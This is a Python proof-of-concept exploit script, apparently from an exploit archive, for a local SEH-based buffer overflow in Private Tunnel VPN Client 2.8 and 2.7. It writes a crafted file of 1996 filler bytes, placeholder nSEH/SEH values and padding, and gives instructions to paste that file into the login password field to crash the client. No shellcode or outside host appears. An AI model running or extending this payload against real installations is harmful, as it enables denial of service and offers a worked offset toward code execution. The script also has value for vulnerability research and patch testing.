#!/usr/bin/python
# Exploit Title     : Private Tunnel VPN Client 2.8 - Local Buffer Overflow (SEH)
# Date              : 25/04/2017
# Exploit Author    : Muhann4d
# Vendor Homepage   : https://www.privatetunnel.com
# Software Link     : https://swupdate.openvpn.org/privatetunnel/client/privatetunnel-win-2.8.exe
# Affected Versions : 2.8 & 2.7   
# Category          : Denial of Service (DoS) Local
# Tested on OS      : Windows 7 SP1 32bit 64bit
# Proof of Concept  : run the exploit, copy the contents of poc.txt, paste it in the password field and press Login.


junkA = "\x41" * 1996
nSEH = "\x42" * 4
SEH = "\x43" * 4
junkD = "\x44" * 9000
f = open ("poc.txt", "w")
f.write(junkA + nSEH + SEH + junkD)
f.close()